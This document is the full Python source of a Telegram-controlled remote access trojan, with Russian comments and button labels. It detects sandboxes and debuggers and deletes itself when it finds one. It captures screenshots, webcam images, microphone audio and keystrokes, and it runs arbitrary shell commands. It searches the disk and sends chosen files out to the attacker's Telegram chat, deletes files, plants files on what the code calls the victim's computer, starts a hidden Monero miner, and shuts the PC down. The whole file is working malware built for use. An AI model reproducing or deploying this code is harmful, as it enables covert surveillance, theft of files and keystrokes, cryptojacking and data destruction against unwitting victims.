import telebot
import pyautogui
import os
import cv2
import pyaudio
import wave
import subprocess
import threading
import time
import shutil
import psutil
import winreg
import sqlite3
import json
import zipfile
import re
import uuid
import numpy as np
import tempfile
import ctypes
from io import BytesIO
from pynput.keyboard import Listener

TOKEN = "8156943007:AAHMxlXVrE1oAEtogjSHtEHzyk4bqf_Iww8"
bot = telebot.TeleBot(TOKEN)

# Глобальные переменные
is_recording = False
is_keylogging = False
is_streaming = False
is_mining = False
audio_thread = None
keylogger = None
stream_thread = None
miner_process = None
chat_id = None
temp_file_path = None
file_search_results = []
current_action = None  # Текущее действие: 'steal' или 'delete'

# ========================
# 1. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ========================

def is_vm_or_debugging():
    try:
        mac = ":".join(re.findall("..", hex(uuid.getnode())[2:].zfill(12)))
        if any(vm_mac in mac for vm_mac in ["00:1C:42", "00:0C:29", "08:00:27"]):
            return True

        blacklist_processes = ["wireshark", "procmon", "processhacker", "ollydbg"]
        for proc in psutil.process_iter():
            if proc.name().lower() in blacklist_processes:
                return True

        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools")
            return True
        except:
            pass

        return False
    except:
        return False

def self_destruct():
    try:
        os.remove(__file__)
        subprocess.call("taskkill /f /im python.exe", shell=True)
    except:
        pass

def clean_temp_files():
    temp_dir = 'temp_uploads'
    if os.path.exists(temp_dir):
        for file in os.listdir(temp_dir):
            try:
                os.remove(os.path.join(temp_dir, file))
            except:
                pass

def create_zip_with_file(file_path):
    """Создает временный ZIP-архив с файлом"""
    zip_filename = tempfile.mktemp(suffix='.zip')
    
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(file_path, os.path.basename(file_path))
        return zip_filename
    except Exception as e:
        print(f"Ошибка создания архива: {e}")
        return None

# ========================
# 2. ФУНКЦИИ РАБОТЫ С ФАЙЛАМИ
# ========================

def search_files(filename):
    """Поиск файлов по имени"""
    results = []
    search_dirs = [
        os.path.expanduser("~"),
        os.path.join(os.getenv("APPDATA", "")),
        os.path.join(os.getenv("LOCALAPPDATA", "")),
        "C:\\"
    ]
    
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
            
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if filename.lower() in file.lower():
                        try:
                            full_path = os.path.join(root, file)
                            results.append(full_path)
                        except:
                            continue
        except:
            continue
            
    return results

def steal_file(file_path):
    """Крадет файл и отправляет в ZIP-архиве"""
    try:
        if not os.path.exists(file_path):
            return False, "Файл не найден"
            
        zip_path = create_zip_with_file(file_path)
        if not zip_path:
            return False, "Ошибка создания архива"
            
        with open(zip_path, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"👜 Украден файл: {os.path.basename(file_path)}")
            
        os.remove(zip_path)
        return True, "Файл успешно украден"
    except Exception as e:
        return False, f"Ошибка: {str(e)}"

def delete_file(file_path):
    """Удаляет указанный файл"""
    try:
        if not os.path.exists(file_path):
            return False, "Файл не найден"
            
        os.remove(file_path)
        return True, f"Файл {file_path} успешно удален"
    except Exception as e:
        return False, f"Ошибка удаления: {str(e)}"

# ========================
# 3. ОСНОВНЫЕ ФУНКЦИИ
# ========================

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        webcam_path = "webcam.jpg"
        cv2.imwrite(webcam_path, frame)
    cap.release()
    return webcam_path if ret else None

def record_audio():
    global is_recording
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                       rate=RATE, input=True,
                       frames_per_buffer=CHUNK)
    frames = []
    
    while is_recording:
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    audio_path = "audio.wav"
    wf = wave.open(audio_path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return audio_path

def start_keylogger():
    global keylogger, is_keylogging
    is_keylogging = True
    keylogger = Listener(on_press=on_press)
    keylogger.start()

def stop_keylogger():
    global keylogger, is_keylogging
    if keylogger:
        keylogger.stop()
        is_keylogging = False

def on_press(key):
    with open("keylog.txt", "a", encoding="utf-8") as f:
        f.write(f"{key}\n")

def execute_cmd(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, encoding="cp866")
        return result[:4000]
    except subprocess.CalledProcessError as e:
        return f"Ошибка: {e.output}"

def close_active_window():
    try:
        pyautogui.hotkey('alt', 'f4')
        return "Активное окно закрыто."
    except Exception as e:
        return f"Ошибка: {e}"

def shutdown_pc():
    try:
        subprocess.call("shutdown /s /t 60", shell=True)
        return "Компьютер выключится через 60 секунд."
    except Exception as e:
        return f"Ошибка: {e}"

def stream_screen_hd():
    global is_streaming
    try:
        resolution = (1280, 720)
        fps = 30
        quality = 90
        
        cv2.namedWindow('HD Stream', cv2.WINDOW_NORMAL)
        cv2.resizeWindow('HD Stream', *resolution)
        
        while is_streaming:
            start_time = time.time()
            
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            
            frame = cv2.resize(frame, resolution)
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
            
            cv2.imshow('HD Stream', frame)
            if cv2.waitKey(1) == 27:
                break
                
            elapsed = time.time() - start_time
            delay = max(0, 1/fps - elapsed)
            time.sleep(delay)
            
    except Exception as e:
        print(f"Ошибка стрима: {e}")
    finally:
        cv2.destroyAllWindows()

def start_miner():
    global miner_process, is_mining
    if not is_mining:
        miner_url = "gulf.moneroocean.stream:10128"
        wallet = "YOUR_XMR_WALLET"
        try:
            miner_process = subprocess.Popen(
                f"xmrig.exe -o {miner_url} -u {wallet} --cpu-max-threads-hint=50 --randomx-mode=fast",
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            is_mining = True
            markup = telebot.types.InlineKeyboardMarkup()
            markup.add(telebot.types.InlineKeyboardButton("🛑 Остановить майнинг", callback_data="stop_mining"))
            return "⛏ Майнинг Monero запущен (CPU).", markup
        except Exception as e:
            return f"Ошибка запуска майнера: {str(e)}", None
    return "Майнинг уже запущен.", None

def stop_miner():
    global miner_process, is_mining
    if is_mining and miner_process:
        miner_process.terminate()
        is_mining = False
        return "Майнинг остановлен."
    return "Майнинг не был запущен."

# ========================
# 4. ИНТЕРФЕЙС И КОМАНДЫ
# ========================

def create_main_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        "📸 Скриншот", "📷 Вебкамера",
        "🎤 Запись звука", "⌨️ Кейлоггер",
        "📹 HD Стриминг", "💻 CMD",
        "❌ Закрыть окно", "🔴 Выключить ПК",
        "💰 Майнинг", "📂 Украсть файл",
        "🗑 Удалить файл", "📁 Добавить файл",
        "💬 Вывести сообщение"
    ]
    markup.add(*[telebot.types.KeyboardButton(btn) for btn in buttons])
    return markup

def create_skip_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("Пропустить поиск", callback_data="skip_search"))
    return markup

def create_stop_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🛑 Остановить", callback_data="stop_action"))
    return markup

# ========================
# 5. ОБРАБОТЧИКИ СООБЩЕНИЙ
# ========================

@bot.message_handler(commands=['start'])
def start_handler(message):
    global chat_id
    chat_id = message.chat.id
    
    if is_vm_or_debugging():
        self_destruct()
    else:
        bot.send_message(chat_id, "✅ Бот активен (Sandbox не обнаружен).", reply_markup=create_main_keyboard())

@bot.message_handler(content_types=['document', 'photo'])
def handle_document(message):
    global temp_file_path
    try:
        temp_dir = 'temp_uploads'
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        if message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            file_name = message.document.file_name
            file_data = bot.download_file(file_info.file_path)
        elif message.content_type == 'photo':
            file_info = bot.get_file(message.photo[-1].file_id)
            file_name = f"photo_{file_info.file_id}.jpg"
            file_data = bot.download_file(file_info.file_path)
        
        temp_file_path = os.path.join(temp_dir, file_name)
        
        with open(temp_file_path, 'wb') as f:
            f.write(file_data)
        
        file_size = os.path.getsize(temp_file_path) / 1024
        bot.send_message(
            message.chat.id,
            f"✅ Файл '{file_name}' успешно загружен ({file_size:.2f} KB).\n"
            "Отправьте полный путь для сохранения (например: C:\\folder\\file.txt)"
        )
        
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка загрузки файла: {str(e)}")
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    global is_recording, is_keylogging, is_streaming, is_mining, temp_file_path, current_action
    
    try:
        if message.text == "📸 Скриншот":
            bot.send_photo(message.chat.id, open(take_screenshot(), 'rb'))
            os.remove("screenshot.png")

        elif message.text == "📷 Вебкамера":
            webcam_path = capture_webcam()
            if webcam_path:
                bot.send_photo(message.chat.id, open(webcam_path, 'rb'))
                os.remove(webcam_path)
            else:
                bot.send_message(message.chat.id, "Не удалось получить изображение с камеры.")

        elif message.text == "🎤 Запись звука":
            is_recording = True
            audio_thread = threading.Thread(target=lambda: bot.send_audio(message.chat.id, open(record_audio(), 'rb')))
            audio_thread.start()
            bot.send_message(message.chat.id, "Запись звука начата...", reply_markup=create_stop_keyboard())

        elif message.text == "⌨️ Кейлоггер":
            start_keylogger()
            bot.send_message(message.chat.id, "Кейлоггер запущен...", reply_markup=create_stop_keyboard())

        elif message.text == "📹 HD Стриминг":
            is_streaming = True
            stream_thread = threading.Thread(target=stream_screen_hd)
            stream_thread.start()
            bot.send_message(message.chat.id, "🌀 HD стриминг запущен (ESC для остановки)")

        elif message.text == "💻 CMD":
            msg = bot.send_message(message.chat.id, "Введи команду:")
            bot.register_next_step_handler(msg, process_cmd)

        elif message.text == "❌ Закрыть окно":
            bot.send_message(message.chat.id, close_active_window())

        elif message.text == "🔴 Выключить ПК":
            bot.send_message(message.chat.id, shutdown_pc())

        elif message.text == "💰 Майнинг":
            response, markup = start_miner()
            if markup:
                bot.send_message(message.chat.id, response, reply_markup=markup)
            else:
                bot.send_message(message.chat.id, response)

        elif message.text == "📂 Украсть файл":
            current_action = 'steal'
            msg = bot.send_message(message.chat.id, 
                                 "Введите имя файла для поиска или полный путь:\n"
                                 "(например: 'passwords.txt' или 'C:\\Users\\Admin\\file.txt')",
                                 reply_markup=create_skip_keyboard())
            bot.register_next_step_handler(msg, process_file_search)

        elif message.text == "🗑 Удалить файл":
            current_action = 'delete'
            msg = bot.send_message(message.chat.id, 
                                 "Введите имя файла для поиска или полный путь:\n"
                                 "(например: 'temp.txt' или 'C:\\Windows\\temp.txt')",
                                 reply_markup=create_skip_keyboard())
            bot.register_next_step_handler(msg, process_file_search)

        elif message.text == "📁 Добавить файл":
            bot.send_message(message.chat.id, "Отправьте файл или фото, которое нужно добавить на компьютер жертвы")
            temp_file_path = None

        elif message.text == "💬 Вывести сообщение":
            msg = bot.send_message(message.chat.id, "Введите сообщение, которое нужно показать на экране:")
            bot.register_next_step_handler(msg, process_popup_message)

        elif temp_file_path and os.path.exists(temp_file_path):
            try:
                destination = message.text.strip()
                os.makedirs(os.path.dirname(destination), exist_ok=True)
                shutil.copy2(temp_file_path, destination)
                bot.send_message(message.chat.id, f"✅ Файл успешно сохранен как {destination}")
                os.remove(temp_file_path)
                temp_file_path = None
            except Exception as e:
                bot.send_message(message.chat.id, f"⚠️ Ошибка сохранения файла: {str(e)}")
                if os.path.exists(temp_file_path):
                    os.remove(temp_file_path)
                temp_file_path = None

    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}")

def process_file_search(message):
    global current_action
    
    if message.text == "Пропустить поиск":
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, "Введите полный путь к файлу, который нужно украсть:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, "Введите полный путь к файлу для удаления:")
            bot.register_next_step_handler(msg, process_file_deletion)
        return
    
    search_results = search_files(message.text)
    
    if search_results:
        response = "🔍 Найдены файлы:\n" + "\n".join(f"📄 {f}" for f in search_results[:20])
        
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, response + "\n\nВведите полный путь к нужному файлу:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, response + "\n\nВведите полный путь к файлу для удаления:")
            bot.register_next_step_handler(msg, process_file_deletion)
    else:
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, "Файлы не найдены. Введите полный путь к файлу вручную:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, "Файлы не найдены. Введите полный путь к файлу вручную:")
            bot.register_next_step_handler(msg, process_file_deletion)

def process_steal_file(message):
    file_path = message.text.strip()
    success, result = steal_file(file_path)
    if success:
        bot.send_message(message.chat.id, f"✅ {result}")
    else:
        bot.send_message(message.chat.id, f"⚠️ {result}")

def process_file_deletion(message):
    file_path = message.text.strip()
    success, result = delete_file(file_path)
    if success:
        bot.send_message(message.chat.id, f"✅ {result}")
    else:
        bot.send_message(message.chat.id, f"⚠️ {result}")

def process_popup_message(message):
    try:
        with tempfile.NamedTemporaryFile(suffix='.vbs', delete=False, mode='w', encoding='utf-8') as f:
            f.write(f'MsgBox "{message.text}", vbInformation, "Сообщение"')
            vbs_path = f.name
        
        subprocess.Popen(['wscript.exe', vbs_path], shell=True)
        time.sleep(2)
        os.remove(vbs_path)
        bot.send_message(message.chat.id, "✅ Сообщение успешно показано на экране")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка при выводе сообщения: {str(e)}")

def process_cmd(message):
    cmd = message.text.strip()
    if cmd.lower() in ("shutdown", "format", "rm -rf"):
        bot.send_message(message.chat.id, "❌ Команда заблокирована.")
    else:
        result = execute_cmd(cmd)
        bot.send_message(message.chat.id, f"Результат:\n```\n{result}\n```", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data in ["stop_action", "stop_mining", "skip_search"])
def handle_callbacks(call):
    global current_action
    
    if call.data == "stop_action":
        global is_recording, is_keylogging
        
        if is_recording:
            is_recording = False
            if audio_thread:
                audio_thread.join()
            if os.path.exists("audio.wav"):
                os.remove("audio.wav")
            bot.send_message(call.message.chat.id, "Запись звука остановлена.")
        
        elif is_keylogging:
            stop_keylogger()
            if os.path.exists("keylog.txt"):
                with open("keylog.txt", 'rb') as f:
                    bot.send_document(call.message.chat.id, f)
                os.remove("keylog.txt")
            else:
                bot.send_message(call.message.chat.id, "Лог пуст.")
    
    elif call.data == "stop_mining":
        response = stop_miner()
        bot.send_message(call.message.chat.id, response)
    
    elif call.data == "skip_search":
        if current_action == 'steal':
            msg = bot.send_message(call.message.chat.id, "Введите полный путь к файлу, который нужно украсть:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(call.message.chat.id, "Введите полный путь к файлу для удаления:")
            bot.register_next_step_handler(msg, process_file_deletion)
    
    bot.answer_callback_query(call.id)

if __name__ == "__main__":
    if not is_vm_or_debugging():
        print("Бот запущен...")
        clean_temp_files()
        bot.polling()
    else:
        self_destruct()
